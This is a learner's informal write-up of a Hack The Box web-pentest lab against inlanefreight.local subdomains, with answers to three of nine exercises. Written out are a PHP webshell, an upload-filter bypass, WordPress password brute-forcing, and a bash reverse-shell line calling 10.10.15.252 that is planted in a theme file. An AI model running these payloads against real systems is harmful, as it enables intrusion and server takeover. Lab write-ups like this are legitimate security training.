so we are taught to use eyewitness ( https://github.com/FortyNorthSecurity/EyeWitness )  to help us with this, but first lets add all 11 subdomains to a file -> 

1. nano IL_subdomains 
2. inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local 

3. git clone https://github.com/FortyNorthSecurity/EyeWitness
4. cd EyeWitness/Python/setup
5. sudo ./setup.sh 
6. cd ..
7. make suer all subdomains are added to /etc/hosts as well 
8. make sure IL_subdomans file is in the /EyeWitness/Python path 
9. ./EyeWitness.py -f IL_Subs -d ILFREIGHT_subs_eyewitness
10. honestly didnt tell us much.. cool ANYWAY 




1.  Use the IDOR vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
1. from reading the section were going to use careers.inlanefreight.local for this one so lets visit and make account. 
2. http://careers.inlanefreight.local/register -> make test account
3. once logged in we see the url pop ->  http://careers.inlanefreight.local/profile?id=9 
4. lets just play with the id= 
5. http://careers.inlanefreight.local/profile?id=4 -> HTB{8f40ecf17f681612246fa5728c159e46}


2.  Exploit the HTTP verb tampering vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).  ** need help with pattern recognition on this or how the fuck they figured this out??? *** 
1. http://dev.inlanefreight.local 
2. gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
<snipped>
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/.htaccess.php        (Status: 403) [Size: 288]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]
/index.php            (Status: 200) [Size: 2048]
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]
/server-status        (Status: 403) [Size: 288]
/upload.php           (Status: 200) [Size: 14]
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/.php                 (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]

3. we see an uploads directory 
4. open burp 
5. intercept a request from http://dev.inlanefreight.local/upload.php -> send to repeater -> send -> Response -> 
HTTP/1.1 200 OK
Date: Sat, 22 Mar 2025 19:07:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 14
Content-Type: text/html; charset=UTF-8
Via: 1.1 dev.inlanefreight.local
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

403 Forbidden

6. k back it up, close and open burp again and just use burps browser -> go to http://dev.inlanefreight.local -> forward request then go to http://dev.inlanefreight.local/upload.php -> send to repeater and forward. we get 403 error 
7. in repeater change the request option to TRACK and send we get -> 200 status and we see X-Custom-IP-Authorization: 172.18.0.1 -> lets move that to the REQUEST side and make it X-Custom-IP-Authorization: 127.0.0.1 
8. hit send, then do the same from proxy and burp browser and forward and finally were at the actual upload.php page... * dumb * 
9. get to the response page of the TRACK reuqest and then go to browse, we can upload a webshell jsut save it with the .php extension 
10) <?php system($_GET['cmd']); ?>  -> save to sick.php
11. we see that upload failed adn we get the error -> JPG, JPEG, PNG & GIF files are allowed.
12. which shows that some weak client-side validation is likely in place. We can grab the POST request, send it to Repeater once again and try modifying the Content-Type: header in the request to see if we can trick the application into accepting our file as valid. We'll try altering the header to Content-Type: image/png
13. in burp repeater it worked and we see that it says File uploaded /uploads/sick.php
14. now e can confirm with curl in terminal -> curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=whoami
www-data
15. curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=ls+/var/www/html
css
flag.txt
images
index.php
js
upload.php
uploads
16. curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=cat+/var/www/html/flag.txt
css
flag.txt
images
index.php
js
upload.php
uploads
17. curl -s http://dev.inlanefreight.local/uploads/sick.php?cmd=cat+/var/www/html/flag.txt
HTB{57c7f6d939eeda90aa1488b15617b9fa}
 

oi fuckin vey m8888888888888888 


3.  Exploit the WordPress instance and find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).
1. ok so we know were gonna be dealing with ir.inlanefreight.local from the material. 
2. sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
3. we find a vulnerable plugin with mastamail 
4. if we run sudo -e u -t 500 --url http://ir.inlanefreight.local we can enumerate users -> 
User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

5. ilfreightwp, john, tom, and james are all users in the wp site. 
6. we can try to brute force with this pass list https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt 
7. sudo wpscan --url http://ir.inlanefreight.local -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -U ilfreightwp
8. [+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                             
Trying ilfreightwp / 123123 Time: 00:00:00 <  > (10 / 109)  9.17%  ETA: ??:??:?? 
9. so we have login creds -> ilfreightwp:password1 
10. go to http://ir.inlanefreight.local/wp-login.php  login with creds 
11. once in admin page -> themes -> theme file editor http://ir.inlanefreight.local/wp-admin/theme-editor.php 
12. from wp-scans and prior boxes were gonna edit the 404 error page for twenty twenty theme 
13. add this -> exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.252/4444 0>&1'"); 
14. now nc -> nc -nlvp 4444
15 navigate to http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php
16.catch shell 
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.252] from (UNKNOWN) [10.129.245.86] 48434
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cat /var/www/html/flag.txt
HTB{e7134abea7438e937b87608eab0d979c}



4.  Enumerate the "status" database and retrieve the password for the "Flag" user. Submit the value as your answer.

5.  Steal an admin's session cookie and gain access to the support ticketing queue. Submit the flag value for the "John" user as your answer.

6.  Use the SSRF to Local File Read vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).

7.  Register an account and log in to the Gitlab instance. Submit the flag value (flag format : HTB{}).

8. Use the XXE vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).

9.  Use the command injection vulnerability to find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).

